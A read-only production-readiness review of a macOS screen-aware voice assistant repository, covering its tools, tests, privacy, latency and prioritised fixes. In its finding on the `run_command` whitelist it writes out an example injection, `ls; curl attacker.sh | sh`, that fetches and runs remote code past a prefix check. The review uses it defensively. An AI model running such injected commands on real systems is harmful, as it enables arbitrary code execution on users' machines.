# SpectraVoice Production-Readiness Survey

Repo: `nihanthnaidu007/SpectraVoice---Screen-Aware-Mac-Voice-Assistant` (~9,450 lines of Python across 30 files, 4 commits, single-author project). Survey was read-only; nothing was edited, committed, or opened as a PR. Branch state: `main`, clean.

## 1. What the product IS

SpectraVoice is a **macOS voice assistant you talk to constantly** (no wake word — it listens continuously) that **sees your screen with every utterance** and can **control your Mac**: open apps, click by screen coordinates, type, scroll, drag, search files, run whitelisted shell commands, and open URLs. It answers with OpenAI text-to-speech and supports **barge-in** (interrupting its speech by talking over it).

Verified behavior (from code, not the README):

- **Speech recognition**: local Whisper via `speech_recognition`'s `recognize_whisper` (transcription happens on-machine, model size `tiny`–`large`, default `base`) — `services/spectravoice_assistant.py:214`.


- **Screen capture**: a daemon thread grabs the full screen every 0.2 s with `PIL.ImageGrab.grab()`, downscales to 0.6–0.8, JPEG-encodes to base64 — `io/vision/screen_capture.py:52-77`. One fresh screenshot is attached to **every** voice query.


- **LLM**: provider abstraction in `llm/` — cloud `OpenAIProvider` (GPT-5 family, vision + native tool calling) and local `OllamaProvider` (llama3.2/llava/etc., with JSON-prompt "tool augmentation" for models lacking native tool calls). Selection order: CLI flags → `LLM_PROVIDER` env → tkinter GUI selector → terminal prompt (`main.py:98-160`, `llm/factory.py`).


- **Tools**: 13 macOS automation tools in `tools/tool_executor.py` (`TOOL_SCHEMAS`): `open_application`, `type_text`, `click_element`, `click_at_cursor`, `move_mouse`, `drag_mouse`, `get_mouse_position`, `search_files` (Spotlight `mdfind`), `run_command`, `keyboard_shortcut`, `scroll`, `take_screenshot`, `open_url`. Clicks go through a `SmartClicker` that verifies a click "worked" by diffing before/after screenshots (`tools/smart_click.py:119`).


- **Conversation memory**: in-process, last 20 messages (`core/conversation.py`). Nothing persists across restarts.


- **Voice UX**: heuristic noise/Whisper-hallucination/self-echo filtering (`io/audio/voice_detector.py`), thread-safe TTS with ~170 ms barge-in interrupt (`io/audio/tts.py`), a floating status dot built with PyObjC (`io/indicator.py`), performance metrics per interaction (`PerformanceMetrics` in the orchestrator).


- **Web search**: Tavily, triggered by hand-tuned keyword/regex heuristics for time-sensitive questions (`tools/web_search.py`); disabled silently if `TAVILY_API_KEY` is unset.



**Target user**: a single local user on their own Mac who wants hands-free computer control. This is a personal-power-tool, not a multi-user service — the production bar is therefore reliability, permissions, privacy, and install experience rather than scale.

**Data flow**: mic → Whisper (local) → SmartVoiceDetector validation → screenshot from cache → LLM (prompt + base64 screenshot + history + tool schemas) → tool calls executed locally → follow-up LLM round → OpenAI TTS → speakers, with echo-suppression on the mic path.

## 2. Maturity signals

| Area | State | Evidence |
| --- | --- | --- |
| Tests | Two files, ~900 lines of decent **mocked unit tests** for the LLM providers and tool schemas/safety config. Zero tests for the orchestrator, voice detector, TTS, screen capture, tool handlers, or click verification. Self-written runner + pytest-compatible. | `tests/test_llm_providers.py`, `tests/test_function_calling.py` |
| CI/CD | **None.** No `.github/`, no workflows, no lint config, no formatter config. | repo tree |
| Packaging | **Not installable.** No `pyproject.toml`/`setup.py`; `main.py:14` and both test files hand-roll `sys.path.insert`. No lockfile. | repo tree |
| Dependency hygiene | Everything floor-pinned (`>=`) with no upper bounds; Whisper installed from **git master** (`openai-whisper @ git+https://github.com/openai/whisper.git`) — a non-reproducible, breakage-prone source; heavy `torch` pulled for it. `requirements.txt:10` |   |
| Secret handling | **No hardcoded keys found** (scanned all `.py`). Keys via `.env`/environment (`OPENAI_API_KEY`, `TAVILY_API_KEY`); missing-key paths produce clear user messages (`llm/factory.py:211`, `llm/openai_provider.py:75-83`). **But** the README instructs `cp .env.example .env` and **no `.env.example` exists in the repo**, and there is **no `.gitignore`** — `.DS_Store` files and `__pycache__/*.pyc` are committed. | `README.md:66`, `git ls-files` |
| Logging | stdout-only via `logging_config.py` (`force=True` basicConfig). The YAML config's file/rotation settings (`logs/assistant.log`, size/backup) are **never wired up** — there is no file logging at all, so post-crash diagnosis is impossible. | `utils/logging_config.py:15-31`, `config.yaml:86-94` |
| Error handling | Better than typical for a student project: typed `LLMError` hierarchy per provider, `retry_with_backoff` decorator, an `ErrorHandler` with classification patterns and health stats (`utils/error_handler.py`), TTS device-error recovery (`_reinit_audio`, `tts.py:365`). Weaknesses: broad `except Exception` + silent `pass` in cleanup paths (`spectravoice_assistant.py:378-382`), screen-capture errors go silent after 3 warnings (`screen_capture.py:79-82`). |   |
| Config system | `utils/config.py` (411 lines, YAML + env overrides + validation) and `config.yaml` are **dead code** — nothing outside `utils/__init__.py` imports `ConfigManager`. Runtime settings actually live in hardcoded constants (`MODE_CONFIG`, `BARGE_IN_*` in the orchestrator). Hotkeys in config are marked "not yet implemented". | grep: no non-self imports |
| Docs | README is unusually good (546 lines: install, permissions, provider matrix, troubleshooting) but references the missing `.env.example` and claims a repo URL template that doesn't match. `docs/BARGE_IN_TESTING.md` is a solid manual test guide. |   |
| Tests/CI for macOS paths | None. Permission failures, missing mic, missing screen-recording grant are all untested and only partially surfaced at runtime. |   |

## 3. Production gaps specific to a desktop voice assistant

1. **Permission flows are manual-only.** README tells users to flip Microphone / Screen Recording / Accessibility in System Settings (`README.md:78-92`). The app never *detects* a missing grant: without Screen Recording, `ImageGrab.grab()` fails and the capture loop just logs 3 warnings then goes silent (`screen_capture.py:79-82`); the assistant then refuses every query with "No screen data available" (`spectravoice_assistant.py:271`). No `--doctor` / first-run check exists.


2. **Privacy of captured screen content.** A full screenshot of whatever is on screen (passwords, messages, email) is sent to OpenAI **on every utterance** by default (`assistant.py:170-190`, `openai_provider.py:222-229`). There is no consent screen, no per-query "don't look" state, no pause-hotkey (hotkeys are unimplemented), and no on-screen indication of *what* is being uploaded beyond the status dot. This is the single biggest trust gap for distribution.


3. **`run_command` whitelist is bypassable.** Prefix matching (`tool_executor.py:429-437`) + `shell=True`: any command *starting with* a whitelisted prefix is allowed, so `ls; curl attacker.sh | sh` or `python -c '<arbitrary code>'` passes the check while the blocklist (substring match on a small list) misses it. Whitelisting `osascript`, `python`, `curl`/`wget` is effectively arbitrary-code execution. **Blocking defect for any distribution.**


4. **`type_text` builds AppleScript by string interpolation** (`tool_executor.py:549-560`) — it only escapes `\` and `"`; LLM-generated text containing quotes/newlines produces keystrokes that can misfire or break the AppleScript. Fragile, and injecting keystrokes into whatever window is focused without confirmation is a misfire risk.


5. **Audio device handling is minimal.** `Microphone()` with no device selection, `energy_threshold` hardcoded to 5000 with dynamic adjustment *disabled* (`spectravoice_assistant.py:317-321`) — fails on quiet mics and noisy environments. TTS opens the default output device; no device enumeration or switch handling (bluetooth reconnect mid-session → `OSError` → one re-init attempt). No startup error path if no mic exists.


6. **Latency.** Full Whisper transcription on the main audio thread (blocking, model-dependent: `base` ~0.3-1 s on Apple Silicon, `large` many seconds), non-streaming LLM round trips ×2 when tools fire, and TTS that synthesizes the *entire* response before playing (no streaming chunks, text hard-truncated to 500 chars, `tts.py:342`). Perceived response latency will routinely be 3-10 s; nothing streams.


7. **Offline vs cloud.** Whisper runs locally (good), but the *default* provider is cloud, web-search silently no-ops without `TAVILY_API_KEY`, and there is no fallback when OpenAI is unreachable mid-session — the query is dropped with a log line. Local Ollama mode works offline but loses vision unless the user knows to pull `llava`.


8. **Crash resilience.** SIGINT/SIGTERM set `running=False` (graceful), but an uncaught exception in any background thread (audio callback has a broad catch; the capture thread and indicator do not) kills the assistant with no log file, no restart, no crash report. `atexit`-registered cleanup swallows all errors.


9. **First-run setup.** Requires: clone → venv → 2 brew installs → pip install (including torch + git-master whisper) → hand-create `.env` → 3 manual permission grants → optionally install Ollama and pull models. One missing step produces confusing failures (e.g., `cp .env.example` fails because the file doesn't exist). No setup wizard, no `make setup`, no doctor.


10. **Persistence & settings.** Memory, metrics, provider choice, and the echo filter all reset on every launch; provider choice must be re-selected or env-pinned every time. No settings UI, no remembered preferences (the config system that would enable this is unwired dead code).



## 4. Prioritized high-impact upgrades

Ordered by impact toward "a genuinely usable product":

1. **Fix the `run_command` sandbox (BLOCKING — security).** Replace prefix + shell=True with an argv-list allowlist (no shell), remove `python`/`osascript`/`curl` from it, and reject shell metacharacters. File: `tools/tool_executor.py:429-465`.


2. **Privacy gate for screen upload (BLOCKING — trust).** Add a visible "pause screen sharing" toggle + first-run consent notice; make local (Ollama/llava) mode a first-class, clearly-labeled privacy option; document exactly what leaves the machine. Files: `core/assistant.py:170-190`, `io/vision/screen_capture.py`.


3. **Wire the dead config system.** Point `MODE_CONFIG`/barge-in thresholds/logging-file settings at `ConfigManager`, enabling user-tunable settings and file logging in one move. Files: `utils/config.py` (exists, unused), `services/spectravoice_assistant.py:83-89`, `utils/logging_config.py`.


4. **Add file logging + crash capture.** RotatingFileHandler per the already-specified config, plus `threading.excepthook` and a top-level crash handler writing to disk. Fixes "silent death" and enables support. Files: `utils/logging_config.py`, `spectravoice_assistant.py:106-109`.


5. **First-run doctor + permission detection.** `--doctor` flag that checks mic access, screen-recording grant (capture a test frame), accessibility (move cursor 1px), API keys, Ollama reachability, and prints a fix-it checklist. Files: new module + `main.py`; reuses checks in `llm/openai_provider.py:is_available`, `llm/ollama_provider.py:is_available`.


6. **Ship `.env.example`, `.gitignore`, and pinned dependencies.** Add the missing `.env.example` (README already references it), a `.gitignore` (untrack committed `.DS_Store`/`__pycache__`), and pin dependencies with an upper bound + a real PyPI whisper pin (drop the git-master install). Files: `requirements.txt`, repo root.


7. **Streaming/latency work.** Stream TTS (OpenAI streaming PCM or chunked synthesis), run Whisper in a worker so listening never blocks, and consider `tiny.en` default. Biggest perceived-quality win after permissions. Files: `io/audio/tts.py:339-345`, `spectravoice_assistant.py:214`.


8. **Audio device management.** Enumerate input/output devices, add `--input-device`/`--output-device` flags, keep dynamic energy threshold on with a sane floor, and handle device-disconnect re-init on both paths. Files: `spectravoice_assistant.py:317-329`, `io/audio/tts.py`.


9. **CI + lint + packaging.** GitHub Actions running pytest + ruff on macOS runner, plus a `pyproject.toml` so `pip install -e .` works (drop the `sys.path` hacks in `main.py:14` and both test files). Prerequisite for every other change being maintainable.


10. **Expand tests to the risky core.** Unit tests for `SmartVoiceDetector` (pure logic, very testable), the command sanitizer, `SmartClicker` verification with synthetic images, and `ToolExecutor` dry-run paths. Current tests cover the *least* dangerous code.


11. **Persistence & recall.** Save conversation memory, chosen provider, and metrics to disk (SQLite/JSON in `~/.spectravoice/`, which already exists for the audit log in `tools/safety.py:91`); offer "resume last session".


12. **Confirmation flow for high-risk actions.** `safety.py` has a complete `SafetyValidator` + confirmation callback that is never wired to `ToolExecutor` (which uses its own looser `SafetyConfig`); connect them and enable voice/terminal confirmation for HIGH-risk tools. Files: `tools/safety.py:84-160`, `tools/tool_executor.py:404-420`.



## Blocking defects summary

- **`run_command` whitelist bypass** (`tools/tool_executor.py:429-465`) — arbitrary code execution through the voice tool loop.


- **Unconditional full-screen upload to a third party** with no consent/pause control (`core/assistant.py:170-190`) — a privacy defect for anything beyond personal use.


- **Broken first-run instructions**: README's `cp .env.example .env` fails; no `.env.example` in repo (and no `.gitignore` — build/OS artifacts committed).
